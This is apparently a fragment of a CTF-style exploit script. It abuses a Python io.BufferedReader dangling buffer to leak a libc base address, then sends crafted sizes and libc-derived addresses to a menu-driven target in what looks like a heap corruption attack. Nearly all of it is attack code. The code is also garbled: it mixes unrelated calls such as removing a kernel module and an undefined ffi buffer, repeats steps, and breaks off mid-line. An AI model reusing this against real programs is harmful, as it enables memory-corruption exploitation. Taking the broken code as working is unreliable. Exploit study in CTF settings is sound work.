import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
rmmod("/tmp/ramfs.ko")

buf = ffi.buffer(view, 8)
v = u64(buf)
libc = v - 0x3c5600
success("libc = %#x" % libc)

rmmod("/tmp/ramfs.ko")
# free()

sla('> ','1')
sla('> ',str(0x80))
sla('> ',str(0xa0))
sla('> ',str(0x50))
# leak
raw_input()

sla('> ','1')
sla('> ',str(libc + 0x3c5600 + 8))
raw_input()
sla('> ',str(0xff))
raw_input()
sla('> ','4')
raw_input()

sla('> ','4')
raw_input()
sla('> ',str(0x80 - 24))
raw_input()

sla('> ','1')
sla('> ',str(libc + 0x3
